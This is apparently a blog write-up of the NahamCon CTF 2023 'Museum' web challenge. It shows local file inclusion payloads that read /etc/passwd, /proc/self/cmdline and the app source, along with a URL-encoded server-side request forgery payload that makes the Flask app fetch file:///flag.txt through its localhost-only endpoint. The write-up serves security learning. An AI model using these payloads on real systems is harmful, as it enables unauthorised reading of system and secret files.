---
title: NahamCon CTF 2023 - Museum
date: 2023-06-19 09:00:00 +0800
categories: [NahamCon CTF 2023, Web]
tags: [web, lfi, ssrf, urlencode, flask, proc]
media_subpath: /assets/img/ctfs/nahamcon2023/museum/
image:
  path: museum.jpg
---

## Info

| Name                                                                   | Difficulty | Author                                          |
|------------------------------------------------------------------------|------------|:------------------------------------------------|
| [Museum](https://github.com/v3he/ctfs/tree/master/nahamcon2023/museum) | Medium     | [JohnHammond](https://twitter.com/_johnhammond) |

> Check out our museum of artifacts! Apparently, soon they will allow public submissions, just like in Animal Crossing! Retrive the flag out of `/flag.txt` in the root of the file system. 
{: .prompt-info }

## Recon

The first thing we see when we enter the website is what appears to be a gallery with different images and a link to upload ourselves to the museum.

![Museum Home Page](main-page.png)

If we click on View to see one of the images in particular, we come across the following page:

![Museum Image Page](image-view.png)

What is most striking is the URL `?artifact=angwy.jpg`. After some testing, I realized that the web is vulnerable to `Local File Inclusion`, and with a url like `?artifact=//etc/passwd` we can extract information from the system.

![LFI Passwd File](lfi-passwd.png)

## Local File Inclusion

Obviously, the first thing I tried to do was to extract the `flag.txt`, but it seems to be blocked when it detects that string in the url.

![LFI Flag File](lfi-flag.png)

After a while of walking around and not finding anything that worked for me, I tried to extract information on how the application was launched using `?artifact=//proc/self/cmdline`.

```bash
python3/home/museum/app.py
```
{: .nolineno }

We can see that the application is made with python, let's get the application code using `?artifact=//home/museum/app.py`.

### Source Code

```python
from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for
import os
import urllib
import urllib.request

app = Flask(__name__)

@app.route('/')
def index():
    artifacts = os.listdir(os.path.join(os.getcwd(), 'public'))
    return render_template('index.html', artifacts=artifacts)

@app.route("/public/<file_name>")
def public_sendfile(file_name):
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return "Error retrieving file", 404
    return send_file(file_path)

@app.route('/browse', methods=['GET'])
def browse():
    file_name = request.args.get('artifact')

    if not file_name:
        return "Please specify the artifact to view.", 400

    artifact_error = "<h1>Artifact not found.</h1>"

    if ".." in file_name:
        return artifact_error, 404

    if file_name[0] == '/' and file_name[1].isalpha():
        return artifact_error, 404
    
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return artifact_error, 404

    if 'flag.txt' in file_path:
        return "Sorry, sensitive artifacts are not made visible to the public!", 404

    with open(file_path, 'rb') as f:
        data = f.read()

    image_types = ['jpg', 'png', 'gif', 'jpeg']
    if any(file_name.lower().endswith("." + image_type) for image_type in image_types):
        is_image = True
    else:
        is_image = False

    return render_template('view.html', data=data, filename=file_name, is_image=is_image)

@app.route('/submit')
def submit():
    return render_template('submit.html')

@app.route('/private_submission_fetch', methods=['GET'])
def private_submission_fetch():
    url = request.args.get('url')

    if not url:
        return "URL is required.", 400

    response = submission_fetch(url)
    return response

def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)

@app.route('/private_submission')
def private_submission():
    if request.remote_addr != '127.0.0.1':
        return redirect(url_for('submit'))

    url = request.args.get('url')
    file_name = request.args.get('filename')

    if not url or not file_name:
        return "Please specify a URL and a file name.", 400

    try:
        submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name))
    except Exception as e:
        return str(e), 500

    return "Submission received.", 200

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5000)
```

The first interesting thing is this line, in which we can see why we could not directly extract the flag.

```python
if 'flag.txt' in file_path:
    return "Sorry, sensitive artifacts are not made visible to the public!", 404
```

We see two more endpoints, `/private_submission_fetch` and `/private_submission`. The second one cannot be called directly, because it checks that the request comes from `127.0.0.1`.

On the other hand, we can call the first one, and it expects us to send it a parameter called `url` and this calls `submission_fetch()` which is the function that makes the request.

## Server Side Request Forgery

Given this circumstance, it is possible to ask `/private_submission_fetch` to make a request to itself from localhost to the `/private_submission` endpoint in order to fetch the `flag.txt`.

### Crafting the Payload

But first we have to create the url that private_submission will need, as we can see it expects two parameters:

- `url` has to be the file we want to open, in our case flag.txt, for this the url will be `url=file:///flag.txt`
- `filename` will be the name that we will see in the main page and that we will visit later, we have to put a name different from `flag.txt`, for example `filename=leak.txt`

With all this in mind, the final url should look something like this: `http://127.0.0.1:5000/?url=file:///flag.txt&filename=leak.txt`

## Exploitation

![SSRF Error](ssrf-error.png)

Theoretically, the payload is correct but it fails continuously and does not create the new `leak.txt` entry. After a while of testing I realized that I had to do `URL encoding` of the whole parameter part of the url, so that it looks like this:

```bash
http://challenge.nahamcon.com:30622/private_submission_fetch?url=http%3A%2F%2F127.0.0.1%3A5000%2Fprivate_submission%3Furl%3Dfile%3A%2F%2F%2Fflag.txt%26filename%3Dleak.txt
```
{: .nolineno }

Even though the response is still an `Internal Server Error`, if we go to the main page, we can see that now a new `leak.txt` entry has been created.

![Leak txt entry](leak-txt.png)

And if we go inside this one, now we can see the flag.

![Flag](flag.png)

## Final Thoughts

An entertaining challenge, a bit tedious the SSRF part due to the error messages and the URL encode issue but it was a matter of time and testing.